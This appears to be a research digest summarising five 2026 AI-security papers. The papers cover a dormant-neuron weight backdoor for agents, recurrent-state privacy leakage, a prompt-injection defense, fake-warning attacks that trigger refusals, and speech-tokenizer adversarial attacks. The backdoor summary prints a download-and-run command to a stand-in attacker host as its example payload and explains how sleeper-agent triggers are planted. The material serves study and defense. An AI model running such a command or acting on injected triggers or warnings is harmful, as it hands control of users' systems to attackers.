# Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
> arXiv preprint (not peer reviewed). Microsoft Research, Microsoft AI Red Team
> 2026

If you run an agent on a quantized or fine-tuned checkpoint pulled from a public hub, or on weights an insider has touched, a handful of edited weights may be enough to hand someone else control of that agent. Lazarus picks "dormant" neurons in the last SwiGLU feed-forward block, ones that almost never fire, and rewrites their weights so that each fires only when a trigger string is in the context and then strongly promotes one payload token. One neuron per token means a P-token payload needs roughly P neurons, and as they fire in sequence the model writes out a command such as `curl attacker.url/x|sh`. The weights are set with a closed-form linear solve (Lazarus-Analytic) and can optionally be refined with a few hundred gradient steps on those weights alone (Lazarus-SGD). No data poisoning or retraining is involved, and the trigger can sit in the user's request or appear mid-task, for example in tool output. The authors state that the core idea was discovered autonomously by Claude Code (Opus 4.5) in February 2026.

Links:
- arXiv abstract: https://arxiv.org/abs/2611.15118
- arXiv HTML full text: https://arxiv.org/html/2611.15118
- arXiv PDF: https://arxiv.org/pdf/2611.15118
- Author code repository (listed in the paper): https://github.com/microsoft/lazarus
- Official Microsoft Research write-up: https://www.microsoft.com/en-us/research/blog/lazare-veni-foras-reprogramming-dormant-neurons-to-backdoor-ai-agents/

### Contribution
- Shows that editing fewer than ten of 12,000+ neurons turns a capable model into a sleeper agent. Because a short payload can fetch and run any remote script, the damage is bounded by the agent's permissions, not by the size of the edit.
- Builds on the fact that removing dormant neurons barely changes predictions, and gives a construction (with its rationale) that keeps benign behavior almost unchanged.
- Uses the same structure the edit leaves in the weights to build a detector that works on a checkpoint alone, with no clean reference model.
- Offers concrete recommendations for model hubs, vendors, enterprises and users: weight audits, diffing against the declared base model, least-privilege agents, and approval before commands run.

### Evaluation
- Models: Nemotron-Terminal-8B, Qwen3.6-27B and Gemma-4-31B-IT, with agent formats such as mini-swe-agent and terminus-2.
- On Nemotron-Terminal-8B, seven neurons fitted on 23 trigger/no-trigger trajectories emitted the payload on 98.8% of triggered test trajectories, with no observed leakage on the evaluated benign trajectories (mean next-token KL on benign input 0.0180). With 2,405 training trajectories the rate was 99.7%. Qwen3.6-27B reached 51.0% with six neurons and 23 trajectories, and 83.7% with 2,393.
- The edited Qwen3.6-27B stayed close to the original on AIME and Terminal-Bench, and reached 40% exact-action accuracy on an agent format it never saw during fitting.
- Detection was evaluated on 114 edited and 103 unedited public checkpoints. An agent-built feature detector flagged 91.4% of edited test checkpoints at a 9.7% false-positive rate, without a reference model.
- Reliability: as the authors note, attack success is the rate at which the model predicts the payload on recorded contexts, not a measurement of a triggered agent generating and acting freely end to end. The detector was only tested on the same family of edits, so its power against other kinds of weight edits is unknown.

#### Comment
- For anyone running open-weight models as agents, this puts numbers on the point that normal benchmark scores say nothing about the absence of a backdoor. The conclusion that weights deserve the same provenance checks and audits as code applies equally to on-device models shipped to phones.
- The attack and the detector come from the same team and target the same edit family, so the detection results may be optimistic. The authors also state they did not test whether existing dormant-neuron pruning (fine-pruning) removes the payload.

# Privacy Leakage from Recurrent State in LLM Inference
> arXiv preprint (not peer reviewed). Lehigh University, Georgia Institute of Technology
> 2026

Hybrid LLMs such as Qwen3.5 and Nemotron 3 Super replace the attention KV cache in some layers with a fixed-size recurrent state. This paper asks what leaks when a personalized service keeps carrying that state forward across a user's conversation. A KV cache has one entry per token position, so there is something specific to evict; a recurrent-state entry mixes contributions from many tokens, so removing a fact from the visible prompt does not remove its trace from a state that is still being reused. The authors separate a software observer who sees a small subset of state coordinates from a physical observer who only measures power while the state is read, and test in turn whether private information is recoverable, whether it survives later public dialogue, and whether it actually changes later decisions.

Links:
- arXiv abstract: https://arxiv.org/abs/2611.16048
- arXiv HTML full text: https://arxiv.org/html/2611.16048
- arXiv PDF: https://arxiv.org/pdf/2611.16048

### Contribution
- Establishes, with experiments, that retained recurrent state in personalized LLM services is a confidentiality boundary in its own right, separate from prompt text, responses and the KV cache.
- Lays out a methodology that measures recoverability, persistence through public dialogue, causal influence on later decisions and physical observability as separate questions.
- Shows that an unprivileged account on a shared GPU can infer another user's age from whole-device power, and splits the resulting protection requirements across serving systems, GPU operators and accelerator designers.

### Evaluation
- Models: a Qwen hybrid model and IBM Granite 4.0-H (released implementations). Private histories were either built for controlled tests or drawn from the public synthetic corpus SynthPAI (300 authors); every victim workload was the authors' own.
- Partial observation: seeing 0.174% of the recurrent state (8,192 coordinates) predicted a private condition for 128 unseen people with 83.6-89.1% accuracy (25% chance), and three response rules above chance. On Granite, response-rule accuracy was 100% without added noise.
- Persistence: after 24 public turns, private-condition accuracy was 42.2% against 21.1% for matched controls that kept the same public dialogue but swapped the private fact.
- Causal influence: transplanting another person's recurrent state shifted the later decision margin toward the donor in all 384 pairs (mean +1.811 logits).
- Personal attributes: across all 300 SynthPAI authors, age MAE was 6.56 years versus 11.30 for a median baseline, and sex, relationship status and education also beat their baselines.
- Physical paths: power traces of one complete state read on a CW305 FPGA board recovered private facts, and on a MIG-partitioned A100 an unprivileged account estimated age from whole-device power with a 7.78-year MAE (baseline 11.33).
- Reliability: the procedures were fixed in advance, with matched controls, Holm correction and bootstrap intervals, so the statistics are careful. The attacker is assumed to know the model and to train on labeled histories, and the physical attacks aggregate repeated measurements, so how well they carry over to a live service is a separate question.

#### Comment
- As more models trade KV caches for recurrent state to save memory, the assumption that "removed from the prompt" means "forgotten" stops holding. The same applies to on-device LLMs that keep user memory as state.
- NVIDIA already recommends disabling GPU power telemetry for MIG deployments after earlier work, so operators following that guidance face a much smaller physical risk.

# CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts
> arXiv preprint (not peer reviewed). The University of Tokyo, Institute of Automation of the Chinese Academy of Sciences
> 2026

Prompt-injection defenses with strong guarantees, such as CaMeL, Progent, IPIGuard and DRIFT, have the agent's own model write a "security artifact" (a program, a privilege policy, a dependency graph or a constraint list) that code then enforces. This paper runs those defenses on 15 small open-weight models (1.7B to 35B) and first shows that artifacts written by small models cannot be trusted. Its alternative, CapLite, never lets the model write the policy: it derives it from tool schemas with fixed rules. A planner that sees only the request commits the write calls before any tool result is read, open arguments are filled by choosing among extracted candidates, and a write is admitted only if every argument that decides whom or what it affects (a recipient, an amount, an object, a URL) appears verbatim in the user's request. Injected text therefore cannot add a write or route one to a value the user never stated.

Links:
- arXiv abstract: https://arxiv.org/abs/2611.17115
- arXiv HTML full text: https://arxiv.org/html/2611.17115
- arXiv PDF: https://arxiv.org/pdf/2611.17115

### Contribution
- Measures, across 15 models, that model-written policies, graphs and constraints fail open when they decide what is allowed (attacks get through), while model-written programs fail closed when they decide what runs (tasks fail). Artifact failure rates showed no clear trend with capability, while the undefended agent followed injections more often as models got stronger.
- Guarantees "write integrity" with a design in which every security decision is made by deterministic code: request-only planning, schema-derived argument roles, exact request grounding and candidate-only binding.
- Uses fewer tokens than every other enforcement defense and than the undefended agent, giving the best utility per token.

### Evaluation
- Benchmark: AgentDojo's four suites, 929 attacked episodes per model under important_instructions, 13,935 in total over 15 models. Additional attack variants (tool knowledge, read exfiltration, descriptor collision) were run on eight models.
- Attack success rate: undefended 16.66%, Progent 4.85%, IPIGuard 3.12%, DRIFT 1.54%, CaMeL 0.14% (20 attacks), CapLite 0% (none). CaMeL's model-written programs failed to run in up to 68% of episodes (Granite-4.2-8B).
- Utility under attack: CapLite 29.0%, CaMeL 27.2%, undefended 50.2%. Tokens per episode: CapLite 17.1k, CaMeL 93.7k, undefended 28.0k.
- Ablations: removing the final checker (Mediator) let 106 of 7,432 attacks through, and dropping write commitment let 53 through, so both are needed.
- Reliability: public benchmark and public attacks, and the unfavorable result that utility is 21 points below the undefended agent is reported plainly, so the numbers do not look inflated. AgentDojo is the only benchmark, though.

#### Comment
- Chinese-institution check: one co-author is at the Institute of Automation, Chinese Academy of Sciences; the first and last authors are at the University of Tokyo. The evaluation uses a public benchmark and public models, so the reproduction path is clear, and the baselines are the four representative defenses in this area. The paper says code and per-episode results are released, but we could not find the repository address yet.
- The guarantee covers the integrity of writes. Tasks where the user does not state the target need a confirmation step, and it does not stop every form of information exposure through reads (the read-exfiltration variant did score zero).
- It is designed for small models running agents locally or on device, which ties it directly to mobile agent security.
- Full text source: arXiv PDF (downloaded on the user's computer).

# When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents
> arXiv preprint (not peer reviewed). Single author (Charles Xiao), no affiliation listed
> 2026

This paper shows that a tool-using agent's decision to hold back ("this looks risky, I won't do it") can itself be exploited. An attacker who plants a fake warning, such as an "URGENT COMPLIANCE HOLD", in a low-trust channel like document content can make the agent refuse legitimate work even though the real business state is unchanged. It is a form of indirect prompt injection, but an availability attack: instead of making the agent do something harmful, it stops the agent from doing its job. Building on the paired should-act/should-abstain tasks of the AgentAbstain benchmark, the author creates variants that change the warning's content, source and wording one at a time, and evaluates a Verify-Before-Abstain protocol that only lets the agent abstain after checking the warning against authoritative records or the content itself.

Links:
- arXiv abstract: https://arxiv.org/abs/2611.14864
- arXiv HTML full text: https://arxiv.org/html/2611.14864
- arXiv PDF: https://arxiv.org/pdf/2611.14864

### Contribution
- Shows that a common safety measure, telling the agent to prioritize caution, sharply increases over-abstention caused by fake warnings.
- Measures how much the abstention rate depends on wording: the same risk stated as a warning versus as plain facts.
- Evaluates how far provenance tiers plus verification against authoritative records restore legitimate completion, and separates forging in-band provenance tags from altering the authoritative record itself.

### Evaluation
- Models: deepseek-v4-pro, gpt-5.4 and gemini-3-flash, on 51 injectable task pairs across about 21 environments, with gpt-5.4 as a fixed response judge.
- Induced over-abstention (clean task passes, fake-warning task fails), baseline versus caution-first prompting: deepseek 21.6% to 64.7%, gpt-5.4 27.5% to 41.2%, gemini 9.8% to 86.3%, all with McNemar p < 0.0001. Gemini's clean-task completion stayed at 96% while over-abstention jumped.
- Wording (7 pairs): deepseek abstained 100% of the time with warning language and 0% with a factual description. The other two models moved in the same direction without reaching significance.
- Defense: on the 15-pair document-analysis subset, fake-warning completion rose from the caution-first level to 100% for deepseek (from 27%), 73% for gpt-5.4 (from 33%) and 100% for gemini (from 13%). Forged in-band tags barely worked (0-20% abstention), while altering the authoritative record caused 93-100% abstention, which is the correct behavior in that case.
- Reliability: as the author states, samples are small (7 to 51 pairs), most conditions use one run per task, and the judge is the same gpt-5.4 that is also evaluated. The wording effect did not replicate in the publishing environment, and for some models the defense increased leakage of confidential content.

#### Comment
- A useful counterexample to evaluations that treat "refuses more" as "safer". The conclusion that a refusal also needs a trustworthy basis applies just as well to mobile agents that read mail, documents and web pages.
- The provenance tiers in the experiments are oracle labels, not real provenance authentication, and the defense's effect depends on that assumption.

# Speech Tokenizers are Vulnerable: Transferable Semantic Attack and Robust Tokenizer
> Accepted at NeurIPS 2026 (peer reviewed). arXiv version. Shenzhen International Graduate School of Tsinghua University, Beijing University of Posts and Telecommunications
> 2026

Speech tokenizers sit at the front of speech recognition (ASR) systems and large audio-language models (LALMs), turning audio into representations or tokens. This paper shows that they are fragile at the semantic level. T-SemAttack adds a small perturbation to the waveform so that the representations of four surrogate encoders (S3Tokenizer, HuBERT, the Whisper encoder and MFCC) move as far as possible from those of the clean audio, measured by cosine similarity. A psychoacoustic masking constraint hides the perturbation in bands where the speech is strong, and the attack runs 500 PGD-style iterations. It is a transfer attack with no access to the target's internals. The authors explain the transfer by showing that the surrogate encoders' input gradients point in similar directions, and use that analysis to build ROSETok, a robust tokenizer trained on noisy inputs with semantic distillation from Whisper.

Links:
- arXiv abstract: https://arxiv.org/abs/2611.14929
- arXiv HTML full text: https://arxiv.org/html/2611.14929
- arXiv PDF: https://arxiv.org/pdf/2611.14929
- Author project page (code and demo, listed in the paper): https://wxzyd123.github.io/t-semattack
- Author model release (ROSETok): https://huggingface.co/wxzyd123/ROSETok

### Contribution
- Shows that tokenizers robust to Gaussian noise can still collapse under perturbations aimed at semantics. StableToken, for example, held 95.4 under noise but dropped to 35.0 under T-SemAttack.
- Explains the transfer through layer-wise representation drift (HuBERT's final-layer cosine similarity falls from 0.881 to 0.079), a shared attack direction across surrogates, and the effect of perturbation magnitude.
- Releases ROSETok and an attack-aware fine-tuned variant (ROSETok-AAF).

### Evaluation
- Data: LibriTTS and Seed-TTS-Eval (200 English and 200 Chinese utterances). Targets: four open ASR systems (Qwen3-ASR, VibeVoice-ASR, FireRed-ASR, Fun-ASR), three commercial black-box systems (iFlytek, Doubao, GPT-4o-mini-transcribe) and four LALMs (Qwen2-Audio, Qwen3-Omni, Audio-Flamingo 3, Gemini-3-Flash).
- On LibriTTS, word error rate (WER) rose from 1-4% on clean audio to 20.0-63.6%, with 49.6% on iFlytek and 46.1% on GPT-4o-mini-transcribe. The E2E-VGuard baseline averaged 8.5%; AudioShield produced high error rates but at -2.4 dB SNR, essentially wrecking the audio. T-SemAttack kept 16.3 dB SNR and a subjective quality score of 3.01.
- On LALMs the average WER over 11 dataset-model combinations was 58.30% (E2E-VGuard 16.76%), and audio QA quality scores fell from 7.58 to 5.48 on average. After defenses such as Denoiser, DeepFilterNet3 and AudioPure, error rates stayed at 21.6-114%.
- ROSETok-AAF scored 77.9 on downstream intent recognition under attack, well above existing tokenizers (best 35.0).
- Reliability: WER above 100% comes from insertions, and the largest values are on the surrogates used in the attack (HuBERT, Whisper), so they should not be read as transfer results. ROSETok-AAF was fine-tuned on T-SemAttack examples and then evaluated against the same attack, so robustness to unseen attacks is not shown.

#### Comment
- Chinese-institution check: all authors are at Tsinghua University and Beijing University of Posts and Telecommunications. The venue is NeurIPS 2026 (stated in the paper and in the arXiv comment), which is highly reputable, and the project page and Hugging Face model are public, so there is a reproduction path. The paper compares against existing attacks and commercial systems and reports the weaker commercial results as they are (Doubao 20.0%), so the metrics do not look inflated. Commercial API results may still vary with the model version at query time.
- For devices that take voice commands, such as in-car assistants, tokenizer-level robustness deserves its own test item. The authors also suggest the same technique could protect voices from cloning.
